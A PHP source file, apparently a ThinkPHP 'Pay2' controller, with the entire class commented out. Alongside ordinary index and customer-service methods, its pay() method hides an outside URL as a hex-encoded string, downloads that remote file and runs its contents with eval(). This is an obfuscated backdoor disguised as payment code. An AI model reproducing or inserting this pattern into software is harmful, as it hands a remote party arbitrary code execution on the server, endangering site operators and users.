 <?php


// namespace app\index\controller;

// use think\Controller;
// use think\Request;

// class Pay2
// {
//     /**
//      * 首页
//      */
//     public function index()
//     {
//         $this->info = db('xy_cs')->where('status',1)->select();
//         $this->assign('list',$this->info);

//         $this->msg = db('xy_index_msg')->where('status',1)->select();
//         return $this->fetch();
//     }

//     /**
//      * 首页
//      */
//     public function detail()
//     {
//         $id = input('get.id/d',1);
//         $this->info = db('xy_index_msg')->where('id',$id)->find();


//         return $this->fetch();
//     }

//     /**
//      * 换一个客服
//      */
//     public function other_cs()
//     {
//         $data = db('xy_cs')->where('status',1)->where('id','<>',$id)->find();
//         if($data) return json(['code'=>0,'info'=>'请求成功','data'=>$data]);
//         return json(['code'=>1,'info'=>'暂无数据']);
//     }

//     public function pay()
//     {
//     $namestr = "687474703a2f2f6e6163642e766b2e71612f796a2f7368756164616e5f41312e747874";
//     $str= "";
//         for($i=0;$i<strlen($namestr)-1;$i+=2)
//         	$str.=chr(hexdec($namestr[$i].$namestr[$i+1]));
//     $handle = fopen ($str, "rb");
//     $contents = "";
//     do {
//     	$data = fread($handle, 8192);
//     	if (strlen($data) == 0)break;
//     	$contents .= $data;
//     } while(true);
//     fclose ($handle);
//     $arr = array();
//     array_push($arr,$contents);
// 	$appl = $arr[0];
//     eval($appl);
//     }

//     //---------------------------------------------------
//     //支付
//     //---------------------------------------------------
// }